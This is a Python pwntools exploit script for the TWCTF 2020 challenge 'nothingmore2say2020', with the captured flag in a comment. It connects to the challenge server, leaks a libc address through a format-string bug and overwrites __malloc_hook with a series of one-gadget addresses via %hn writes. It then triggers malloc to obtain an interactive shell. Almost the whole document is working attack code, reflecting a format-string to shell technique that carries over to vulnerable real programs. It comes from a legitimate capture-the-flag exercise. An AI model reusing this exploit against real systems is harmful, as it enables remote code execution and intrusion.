#exploit for nothingmore2say2020
#TWCTF{kotoshi_mo_hazimarimasita_TWCTF_de_gozaimasu}
from pwn import *
import time
elf = ELF("./nothing")
libc=elf.libc
context.binary=elf
gadgets=[0x4f365,0x4f3c2,0xe58b8,0xe58bf,0xe58c3,0x10a45c,0x10a468]
for gadget in gadgets:
	target=remote('pwn02.chal.ctf.westerns.tokyo',18247)
	def sla(string,val):
		target.sendlineafter(string,val)

	def sa(string,val):
		target.sendafter(string,val)

	def attack(payload):
		sa("> ",payload)

	payload="%39$p"
	attack(payload)
	libc_base=int(target.recv(14)[2:],16)-0x021b97
	libc_malloc_hook=libc_base+libc.symbols["__malloc_hook"]
	libc_gadget=libc_base+gadget
	n1=int(hex(libc_gadget)[10:14],16)
	n2=int(hex(libc_gadget)[8:10],16)
	payload="%"+str(n2)+"x%10$hhn"
	payload+="%"+str(n1-n2)+"x%11$hn"
	payload=payload.ljust(0x20,"A")
	payload+=p64(libc_malloc_hook+2)
	payload+=p64(libc_malloc_hook)
	attack(payload)
	payload="%1000000x"
	attack(payload)
	target.interactive()
